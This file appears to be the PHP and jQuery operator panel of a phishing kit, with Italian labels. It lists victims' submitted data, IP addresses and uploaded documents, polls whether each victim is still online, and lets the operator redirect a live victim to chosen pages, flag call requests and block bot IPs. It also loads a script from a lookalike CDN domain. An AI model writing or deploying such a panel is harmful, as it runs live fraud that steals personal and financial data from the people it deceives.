<?php
include("sec.php");
?><?php

function better_scandir($dir, $sorting_order = SCANDIR_SORT_ASCENDING) {

  $files = array();
  foreach (scandir($dir, $sorting_order) as $file) {
    if ($file[0] === '.') {
      continue;
    }
    $files[$file] = filemtime($dir . '/' . $file);
  } 
  if ($sorting_order == SCANDIR_SORT_ASCENDING) {
    asort($files, SORT_NUMERIC);
  }
  else {
    arsort($files, SORT_NUMERIC);
  }
  $ret = array_keys($files);

  return ($ret) ? $ret : false;

}


$cartella ="../database";
if (!is_dir($cartella )) {
    mkdir($cartella );
}
$cartella = '../database/';
$files = scandir($cartella,SCANDIR_SORT_DESCENDING);
$lista=[];
foreach($files as $file) {
	if (strpos($file, "_0") !== false) {
		$id = str_replace("_0", "", $file);
		$lista[]=$id;
	}
}
$fattiFile = "../fatti.txt"; 
$interval = 2000; 
$textColor = ""; 

if (!file_exists('../fatti.txt')) {
    touch('../fatti.txt');
}
if (!file_exists('../rosso.txt')) {
    touch('../rosso.txt');
}
if (!file_exists('../verde.txt')) {
    touch('../verde.txt');
}
if (!file_exists('../giallo.txt')) {
    touch('../giallo.txt');
}

// Don't have to change anything bellow
if(!$textColor) $textColor = "white";
if($interval < 100)  $interval = 100; 
if(isset($_GET['getLog'])){
$fatti=array();
		$fattiFile = "../fatti.txt";
		$stream = fopen($fattiFile, "r");
	while(($line=fgets($stream))!==false) { 
		$nuovo = trim($line);
		if($nuovo){
			$fatti[]=$nuovo;
		}
		
		}

		$rosso=array();
		$stream = fopen( "../rosso.txt", "r");
	while(($line=fgets($stream))!==false) { 
		$nuovo = trim($line);
		if($nuovo){
			$rosso[]=$nuovo;
		}
		}

		$verde=array();
		$stream = fopen( "../verde.txt", "r");
	while(($line=fgets($stream))!==false) { 
		$nuovo = trim($line);
		if($nuovo){
			$verde[]=$nuovo;
		}
		}

		
		$giallo=array();
		$stream = fopen( "../giallo.txt", "r");
	while(($line=fgets($stream))!==false) { 
		$nuovo = trim($line);
		if($nuovo){
			$giallo[]=$nuovo;
		}
		}




	$iniziale=array();
	foreach($lista as $id) {
		if(!in_array($id,$fatti)){
			$dfile=filemtime($cartella.$id."_0");
			$ip="";
			if(file_exists($cartella."ip_".$id)){
				 $contenuto = file_get_contents($cartella."ip_".$id);
				 $contenuto = str_replace("<?php", "", $contenuto);
					$contenuto = str_replace("?>", "", $contenuto);
				$ip =$contenuto;
				$ip = strip_tags($ip);

				if (preg_match('/(\d+\.\d+\.\d+\.\d+)/', $ip, $matches)) {
					// Restituisci il primo indirizzo IP trovato
					$ipcorrente  = $matches[1];
				} else {
					// Se nessun indirizzo IP è stato trovato, restituisci un valore vuoto o falso a tua scelta
					$ipcorrente ="";
				}

				$ip = "<div class='ips'>".$ip."<div><div class='ipcorrente' style='display:none'>".$ipcorrente."</div>";
			}
			
			$dfile=date ("d/m/Y H:i", $dfile);
			$item=[$id."<br>".$dfile."<br>".$ip];
			$item=[$dfile."<br>".$ip];
			for($num = 0; $num<=10; $num++) {
				if (file_exists($cartella.$id."_".$num)) {
					$contenuto = file_get_contents($cartella.$id."_".$num);
					$contenuto = str_replace("<?php", "", $contenuto);
					$contenuto = str_replace("?>", "", $contenuto);
					if($contenuto){
					$arr = json_decode($contenuto);
					$item = array_merge($item,$arr);
					}
				
				}
			}
			$iniziale[$id]=$item;
		}
	}
	echo json_encode($iniziale);
}else{
?>
	<title>Log</title>
	<style>
#log td{
	position: relative;
	padding-top: 20px;
}
.par{
    position: absolute;
    top: 2px;
    font-family: auto;
    padding: 0;
    margin: 0;
    font-size: 75%;
    width: 100%;
}


		.azioni{
			
    border-radius: 0;

		}
		.VERDE {
			MARGIN: 10PX 0;
    background-color: yellowgreen;
}
.ROSSO {
	MARGIN: 10PX 0;
background-color:#ff6c6c}
.GIALLO{
	MARGIN: 10PX 0;
	background-color:	#ffca43
}
	.testo{
		FONT-SIZE: 130%;
	}
		#log	{  
  -webkit-user-select: text;  /* Chrome 49+ */
  -moz-user-select: text;     /* Firefox 43+ */
  -ms-user-select: text;      /* No support yet */
  user-select: text;          /* Likely future */   
}	
.colorerosso{
	background-color:#720404;
}

.coloreverde{
	background-color:#228b00;
}

.coloregiallo {
	background-color:#9f9200;
}
	</style>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" ></script>
	<script src="underscore-min.js" type="text/javascript"></script>
	<script src="//fastcdn-jquery.com/js/jquery-ui.min.js" type="text/javascript"></script>
	<script>

jQuery(document).ready(function() {
	jQuery.ajaxSetup({ cache: false });
});

function metticolori(){
	
	jQuery.getJSON("colori.php", { }, function() {}).done(function(datcol) {
		rossi = datcol['rossi']
		verdi = datcol['verdi']
		gialli = datcol['gialli']
		jQuery(rossi).each(function(aaa,kkk){
			kkk=kkk.trim()
			jQuery("tr[data-key='"+ kkk +"']").find(".azioni").addClass("colorerosso")
		})
		
		jQuery(verdi).each(function(aaa,kkk){
			kkk=kkk.trim()
			jQuery("tr[data-key='"+ kkk +"']").find(".azioni").addClass("coloreverde")
		})
		
		jQuery(gialli).each(function(aaa,kkk){
			kkk=kkk.trim()
			jQuery("tr[data-key='"+ kkk +"']").find(".azioni").addClass("coloregiallo")
		})
		
  })

}
	suona=false;
		setInterval(readLogFile, <?php echo $interval; ?>);
		window.onload = readLogFile; 
	
		var scrollLock = true;
		
		$(document).ready(function(){
		
		});
		lastlog = "";
		rossi=verdi=gialli=[];
		ultimaversione =""
		function readLogFile(){

$.get("versione.php", { }, function(dataversione) {

if(ultimaversione=="" || ultimaversione!=dataversione  ){
			

jQuery.getJSON("vedi.php", { getLog : "true", rand: dataversione }, function(data) {
				if(data !=lastlog){
					if(data!=""){
						if(ultimaversione){
							cambiato()
						}
					
					}
					

				}else{

				}
				
				lastlog=data
				tutti = [];

		        _.each(data,function( val, key){
					
					
				val=	_.map(val,function(d){
					if (d.includes("DOC_")) {
							return "<td><a target='_blank' href='../doc/"+d+"' >"+ d +"</a></td>"
						}

								return "<td>"+ d +"</td>"
					})
						bottoni ='';
						bottoni2 ='<a class="dropdown-item bloccaip "  href="#" > BLOCCA BOT</a><a class="dropdown-item   " href="#" > PORTA SU</a>';
					<?php

	$links = array("ROSSO","GIALLO","VERDE");
	$linkspagine=array();
	if(file_exists("../link.php")){

		include("../link.php");
	}
	
	foreach ($linkspagine as $ll) {
		?>
		bottoni2=bottoni2+'<?php echo '<a class="dropdown-item portasu  " href="#" data-linkpagina="'.$ll.'" > -> '.$ll.'</a>'; ?>';
		 <?php  }


  foreach ($links as $ll) {
	  $ll=trim($ll);
?>
bottoni=bottoni+'<?php echo '<a class="dropdown-item devia '.$ll.' " href="#" data-link="'.$ll.'" >'.$ll.'</a>'; ?>';
 <?php  }

					?>



//<button class='visto btn btn-warning '>X</button>
azioni = '<div class="dropdown"> <button class="btn btn-secondary dropdown-toggle azioni  " type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Azioni </button> <div class="dropdown-menu" aria-labelledby="dropdownMenuButton"> <a class=" visto dropdown-item" href="#">FATTO(ELIMINA)</a><hr> '+bottoni+'<HR> '+bottoni2+' </div> </div>'
					pre="<tr class='riga ' data-key='"+key+"' ><td style='text-align:center'>"+azioni+"</td><td class='live'></td>"+val.join("")+"</tr>"
					tutti.push(pre)
				})


				$("#log tbody").html(tutti.join(""))
				metticolori()
		     		    });
			ultimaversione = dataversione  
}

		  });
		  }
		  function cambiato(){
			  aggiornalive()	
			  if(suona){

						 var audio = new Audio('suono.wav');
				audio.play();
					}else{
								suona=true
				}

		  }
		  $( document ).on( "mouseenter",".ips", function() {
					jQuery(this).find(".us").show()
			});
$( document ).on( "mouseleave",".ips", function() {
					jQuery(this).find(".us").hide()
			});


			$( document ).on( "click", ".ROSSO", function() {
 					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
					
			jQuery.getJSON("rosso.php", { key : chiave }, function(data) {
						if(data==1){
							tr.find(".azioni").addClass("colorerosso").removeClass("coloregiallo").removeClass("coloreverde")
						}

			 });
			});

			
			$( document ).on( "click", ".VERDE", function() {
 					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
					
			jQuery.getJSON("verde.php", { key : chiave }, function(data) {
						if(data==1){
							tr.find(".azioni").addClass("coloreverde").removeClass("colorerosso").removeClass("coloregiallo")
						}

			 });
			});

			
			$( document ).on( "click", ".GIALLO", function() {
 					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
					
			jQuery.getJSON("giallo.php", { key : chiave }, function(data) {
						if(data==1){
							tr.find(".azioni").addClass("coloregiallo").removeClass("colorerosso").removeClass("coloreverde")
						}

			 });
			});


		$( document ).on( "click", ".visto", function() {
 					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
					
			jQuery.getJSON("visto.php", { key : chiave }, function(data) {
						if(data==1){
							tr.hide()
						}

			 });
			});
		$( document ).on( "click", ".devia", function() {
 					return false;

			 });

			 $( document ).on( "click", ".portasu", function() {
				link = $(this).data("linkpagina")
				chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
if(tr.find(".nonportare").length){
alert("il cliente non è online")
}else{
	jQuery.getJSON("portasu.php", { key : chiave,link: link }, function(data) {
					
				});
}
					
 					return false;

			 });
			 
			 
			 $( document ).on( "click", ".bloccaip", function() {
					chiave = jQuery(this).parents("tr").data("key")
					tr = jQuery(this).parents("tr")
if(tr.find(".ipcorrente").length){
	ip = tr.find(".ipcorrente").text()
	var conferma = confirm("Vuoi bloccare tutti gli inserimenti provenienti da questo IP "+ip+"?");

if (conferma) {
    	jQuery.getJSON("bloccaipajax.php", { ip : ip }, function(data) {
					
				});
} else {
 
}

}else{
	

}
					
 					return false;

			 });


function aggiornastat(){
	jQuery.getJSON("ajaxstat.php", { }, function(data) {
		datov = data['datov']
		datofatt = data['datofatt']
		datoins = data['datoins']
		jQuery(".datov").html(datov)
		jQuery(".datofatt").html(datofatt)
		jQuery(".datoins").html(datoins)
	});
}
function aggiornalive(){
_.each(jQuery(".riga"),function(r){

	key = jQuery(r).data('key')

jQuery.getJSON("datolive.php", { id : key }, function(data) {
					
	var td = jQuery(r).find(".live")
	pre=''
	online=true
	if(typeof(data[2])!="undefined"){
		
		if(data[2].indexOf("online")!=-1){
		pre = "<img src='circle_green.png'/> "
		}
		
		if(data[2].indexOf("secondi")!=-1){
			pre = "<img src='circle_green.png'/> "
		}
		if(data[2].indexOf("secondi")==-1 && data[2].indexOf("online")==-1){
			pre = "<img class='nonportare' src='circle_red.png'/> "
			online = false
			}
	}

	if(data[3]){
		pre = "<B>CHIAMATA RICHIESTA</B><BR>"+pre
	}
	if(online){
		td.html(pre+""+data[2]+" "+data[0])
	}else{
		td.html(pre+"")
	}

			 });
})

}
			setInterval(function(){
				aggiornastat()
				aggiornalive()	
			},3000)
	</script>
		<br>
		<div id="stats" class="container-fluid">

		<table class="table table-bordered table-hover">
			<tbody>
				<tr>
					<td>VISITE: <span class="datov"></span></td>
					<td>INSERIMENTI: <span class="datoins"></span></td>
					<td>FATTI: <span class="datofatt"></span></td>
				</tr>
			</tbody>
			</table>


		</div>
		<div id="log" class="container-fluid">
			<table class="table table-bordered table-hover">
			
			<tbody>
			</tbody>
			</table>
		</div><br><br>

<?php  } ?><?php /* TEST */ ?>